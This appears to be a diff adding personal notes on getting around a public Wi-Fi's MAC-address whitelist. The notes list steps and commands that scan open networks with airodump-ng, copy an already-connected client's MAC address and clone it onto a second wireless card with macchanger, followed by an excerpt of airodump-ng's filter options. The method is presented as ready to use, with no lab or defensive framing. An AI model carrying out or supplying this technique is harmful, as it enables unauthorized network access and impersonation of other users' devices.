@@ -1,0 +1,25 @@
+* PUBLIC WIFIS KEEP TRACK OF ALLOWED USERS BY USING A WHITELIST
+1. SCAN AREA AND FIND SOMEBODY ALREADY CONNECTED TO DEVICE
+2. CONNECT TO PUBLIC WIFI WITH MANAGED DEVICE 
+2. FIND MAC ADDRESS THAT IS ALLOWED IN THE NETWORK WITH MONITORED 
+3. SWAP MAC ADDRESS FROM MANAGED MODE DEVICE TO DEVICE MAC ADDRESS ON PUBLIC WIFI 
+---> 
+
+
+--> # SCAN AREA FOR OPEN NETWORKS
+sudo airodump-ng wlan0 --encrypt OPN
+-> Then copy mac address of client you want to clone 
+
+--> # initiate mac changer (ON CARD THAT IS IN MANAGED MODE)
+sudo ifconfig wlan1 down 
+sudo macchanger -m 86:E3:20:19:18:CA wlan1
+sudo ifconfig wlan1 up
+
+
+ Filter options:
+      --encrypt   <suite>   : Filter APs by cipher suite
+      --netmask <netmask>   : Filter APs by mask
+      --bssid     <bssid>   : Filter APs by BSSID
+      --essid     <essid>   : Filter APs by ESSID
+      --essid-regex <regex> : Filter APs by ESSID using a regular
+
